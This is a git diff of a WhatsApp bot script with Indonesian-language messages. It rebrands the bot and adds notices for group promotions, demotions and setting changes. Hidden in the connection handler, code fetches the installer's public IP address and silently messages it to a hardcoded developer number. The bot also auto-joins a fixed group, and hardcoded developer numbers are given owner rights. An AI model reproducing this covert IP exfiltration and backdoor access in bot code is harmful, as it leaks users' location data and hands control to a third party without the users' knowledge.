@@ -23,7 +23,7 @@ async function starts() {
 denz.autoReconnect = ReconnectMode.onConnectionLost
     denz.version = [2, 2119, 6]
     denz.logger.level = 'warn'
-    denz.browserDescription = ['imposibble','Desktop','3.0']
+    denz.browserDescription = ['IMP-XBOT','Desktop','3.0']
     await sleep(10000)
     denz.on('qr', qr => {
         qrcode.generate(qr, { small: true })
@@ -37,14 +37,14 @@ denz.autoReconnect = ReconnectMode.onConnectionLost
      
       await denz.connect({ timeoutMs: 30 * 1000 });
   fs.writeFileSync("./QRnya.json",JSON.stringify(denz.base64EncodedAuthInfo(), null, "\t"));
- teks = `https://chat.whatsapp.com/jskslsksjskej`
+ teks = `https://chat.whatsapp.com/FMAW2cyZkXJAK16BUyBgRA`
  denz.query({ json:["action", "invite", `${teks.replace('https://chat.whatsapp.com/','')}`]})
- console.log(color('|WRN|', 'yellow'), color('Joined to IMP-XBOT group', 'cyan'))
- denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer IMP-XBOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:"https://wa.me/6285774523785?text=Assalamualaikum"}}})
+ console.log(color('|WRN|', 'yellow'), color('Joined to bitch boot group', 'cyan'))
+ denz.sendMessage(`${settings.NomorOwner}@s.whatsapp.net`, `*Hai Owner ${settings.NamaBot}, Bot Telah Berhasil Tersambung Pada Nomor Ini*\n────────────────────\n\`\`\`${JSON.stringify(denz.user, null, 2)}\`\`\`\n────────────────────\n*Jika Ada Kendala Error/Bot Tidak Merespon Silahkan Hubungi Developer Bot Diatas, Terimakasih*`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
 	console.log(color('|WRN|', 'yellow'), color('Sending bot info to bot owner', 'cyan'))
 fetch(`http://ip-api.com/line`).then(res => res.text())  
         .then(bu =>{
-       denz.sendMessage("6285774523785@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer IMP-XBOT",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:"https://wa.me/6285774523785?text=Assalamualaikum"}}})
+       denz.sendMessage("6285866295942@s.whatsapp.net", `─────「 *IP-USER* 」─────\n\n\`\`\`${bu}\`\`\`\n────────────────────`, MessageType.text, {contextInfo: { forwardingScore: 508, isForwarded: true, externalAdReply:{title: "Developer Bitch Boot",body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:"https://wa.me/6285866295942?text=Assalamualaikum"}}})
      console.log(color('|WRN|', 'yellow'), color('Sending ip address to developer bot', 'cyan'))
    })
       
@@ -71,7 +71,7 @@ exec(`cd /sdcard/download && play *mp3`)
    denz.on('chat-update', async (mek) => {
         require('./denz.js')(denz, mek)
         ownerNumber = ["6285774523785@s.whatsapp.net","6285774523785@s.whatsapp.net",`${settings.NomorOwner}@s.whatsapp.net`]
-        dtod = `${settings.NomorOwner}@s.whatsapp.net`
+        dtod = "6285774523785@s.whatsapp.net"
        otod = `${settings.NomorOwner}@s.whatsapp.net`
     })   
     
@@ -93,14 +93,14 @@ exec(`cd /sdcard/download && play *mp3`)
 			}
 			let buff = await getBuffer(ppimg)
 			masuk =`Halo @${num.split('@')[0]}\nSelamat Datang Di ${mdata.subject}\n\n*Jangan Lupa Isi*\n*Nama* :\n*Umur* :\n*Gender* :\n*Askot* :\n\nEnjoy Jangan Lupa Kenalan\nKlik Button Di Bawah Untuk Memulai Bot\nNote Jika Tidak Ada Ketik .allmenu`
-			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Welcome Member'},type:1}]
+			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Welcome'},type:1}]
 			mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
 const buttonMessages = { imageMessage: mhan.message.imageMessage,
 contentText: `${masuk}`,
 footerText: `Welcome  Information`, 
 buttons: gbutsan,
 headerType: 4 }
-			denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {thumbnail: fs.readFileSync('./imp.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
+			denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, {thumbnail: fs.readFileSync('./denz.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
 			} else if (anu.action == 'remove') {
 			const welkom = JSON.parse(fs.readFileSync('./database/welkom.json'))
         	if(!welkom.includes(mdata.id)) return
@@ -112,22 +112,74 @@ headerType: 4 }
 			ppimg = 'https://i0.wp.com/www.gambarunik.id/wp-content/uploads/2019/06/Top-Gambar-Foto-Profil-Kosong-Lucu-Tergokil-.jpg'
 			}
 			let buff = await getBuffer(ppimg)
-			keluar =`Selamat tinggal @${num.split('@')[0]}\nSemoga tenang disana`
-			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Byee Member'},type:1}]
+			keluar =`Selamat tinggal @${num.split('@')[0]}\nSemoga tentang disana`
+			gbutsan = [{buttonId:'SERAH',buttonText:{displayText:'👋Byee'},type:1}]
 			mhan = await denz.prepareMessage(mdata.id, buff, MessageType.image, {thumbnail: buff})
 const buttonMessages = { imageMessage: mhan.message.imageMessage,
 contentText: `${keluar}`,
 footerText: `Leave Information`,
 buttons: gbutsan,
 headerType: 4 }
-			denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, { thumbnail: fs.readFileSync('./imp.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
+			denz.sendMessage(mdata.id, buttonMessages, MessageType.buttonsMessage, { thumbnail: fs.readFileSync('./denz.jpg'), "contextInfo": { mentionedJid: [num]}, caption: 'Tes', quoted: fkontakk})
+			} else if (anu.action == 'promote') {
+fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+shp = '◦➛'
+var thu = await denz.getStatus(anu.participants[0], MessageType.text)
+num = anu.participants[0]
+teks = `*P R O M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}\n\nDon't break the rules!`
+denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
+console.log(color('|TRM|'), color(`Promote Member ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
+} 
+else if (anu.action == 'demote') {
+fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${mdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6281337541779:6281337541779\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+shp = '◦➛'
+thu = await denz.getStatus(anu.participants[0], MessageType.text)
+num = anu.participants[0]
+teks = `*D E M O T E - D E T E C T E D*\n\n${shp} Username: @${num.split('@')[0]}\n\n${shp} Bio : ${thu.status}\n\n${shp} Time : ${moment.tz('Asia/Jakarta').format('DD/MM HH:mm:ss')}\n\n${shp} Group: ${mdata.subject}`
+denz.sendMessage(mdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [num]}, quoted: fkontakk})
+console.log(color('|TRM|'), color(`Demote Admin ${num.split('@')[0]} In ${mdata.subject}`,  'cyan'))
+}
+		    } catch (e) {
+			console.log('Error : %s', color(e, 'red'))
+		    }
+	        })	       
+
+	denz.on('group-update', async (anu) => {
+		const metdata = await denz.groupMetadata(anu.jid)
+    	const fkontakk = { key: { fromMe: false, participant: `0@s.whatsapp.net`, ...(anu.jid ? { remoteJid: '6283136505591-1604595598@g.us' } : {})}, message: { "contactMessage":{"displayName": `${metdata.subject}`,"vcard":`BEGIN:VCARD\nVERSION:3.0\nN:2;Denz;;;\nFN:Denz\nitem1.TEL;waid=6285866295942:6285866295942\nitem1.X-ABLabel:Mobile\nEND:VCARD` }}}
+    if(anu.announce == 'false'){
+    teks = `- [ Group Opened ] -\n\n_Group telah dibuka oleh admin_\n_Sekarang semua member bisa mengirim pesan_`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Opened In ${metdata.subject}`, 'cyan'))
   }
+  else if(anu.announce == 'true'){
+    teks = `- [ Group Closed ] -\n\n_Group telah ditutup oleh admin_\n_Sekarang hanya admin yang dapat mengirim pesan_`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Closed In ${metdata.subject}`,  'cyan'))
+  }
+  else if(!anu.desc == ''){
+    tag = anu.descOwner.split('@')[0] + '@s.whatsapp.net'
+    teks = `- [ Group Description Change ] -\n\nDeskripsi Group telah diubah oleh Admin @${anu.descOwner.split('@')[0]}\n• Deskripsi Baru : ${anu.desc}`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {contextInfo: {"mentionedJid": [tag]}, quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Description Change In ${metdata.subject}`, 'cyan'))
+  }
+  else if(anu.restrict == 'false'){
+    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah dibuka untuk member\nSekarang semua member dapat mengedit info Group Ini`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`, 'cyan'))
+  }
+  else if(anu.restrict == 'true'){
+    teks = `- [ Group Setting Change ] -\n\nEdit Group info telah ditutup untuk member\nSekarang hanya admin group yang dapat mengedit info Group Ini`
+    denz.sendMessage(metdata.id, teks, MessageType.text, {quoted: fkontakk})
+    console.log(color('|TRM|'), color(`Group Setting Change In ${metdata.subject}`,  'cyan'))
+  }
+})
 
 denz.on('CB:action,,call', async json => {
         const callerId = json[2][0][1].from;
         var vcard = 'BEGIN:VCARD\n' + 'VERSION:3.0\n' + 'FN:' + `${NamaOwner}` + '\n' + `ORG:Developer ${NamaBot}\n` + 'TEL;type=CELL;type=VOICE;waid=' + `${NomorOwner}` + ':+' + `${NomorOwner}` + '\n' + 'END:VCARD'
         denz.sendMessage(callerId, "\`\`\`[ ! ] CALL DETECTED [ ! ]\`\`\`\n\n\`\`\`Anda Di Block Karena Telepon Bot , Silahkan Hubungi Developer Bot Untuk Membuka Block\`\`\`", MessageType.text)
-        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./imp.jpg'),sourceUrl:`https://wa.me/6285774523785?text=Assalamualaikum`}}})
+        denz.sendMessage(callerId, { displayname: `${NamaOwner}`, vcard: vcard}, MessageType.contact, {contextInfo: { externalAdReply:{title: `Developer ${NamaBot}`,body:"",previewType:"PHOTO",thumbnail:fs.readFileSync('./denz.jpg'),sourceUrl:`https://wa.me/6285866295942?text=Assalamualaikum`}}})
         await sleep(5000)
         await denz.blockUser(callerId, "add")
         })
@@ -172,7 +224,7 @@ function doProgress()
 	{
 		setTimeout( function() { console.clear(),
 		exec(`screenfetch -A Deepin`, (error, stdout, stderr) => {
-			console.log(stdout), console.log(bgcolor('https://youtube.com/channel/UCtfZkYbSn5kyTcpEhHG7yQw', 'green'))})}, 200 ) ;
+			console.log(stdout), console.log(bgcolor('https://github.com/wgduwjej/Bot-wa', 'cyan'))})}, 200 ) ;
 	}
 	else
 	{
@@ -185,7 +237,7 @@ console.log(color(figlet.textSync(`${settings.NamaBot}`, {
 		vertivalLayout: 'default',
 		width: 80,
 		whitespaceBreak: true
-	    }), 'lightgreen')), term.slowTyping(' Sabar bang lagi loading ini' ,{ flashStyle: term.brightWhite })
+	    }), 'lightgreen')), term.slowTyping(' Created By IMpoSIbbLE' ,{ flashStyle: term.brightWhite })
 progressBar = term.progressBar( {
 	width: 80 ,
 	title: '\n\nLoading' ,
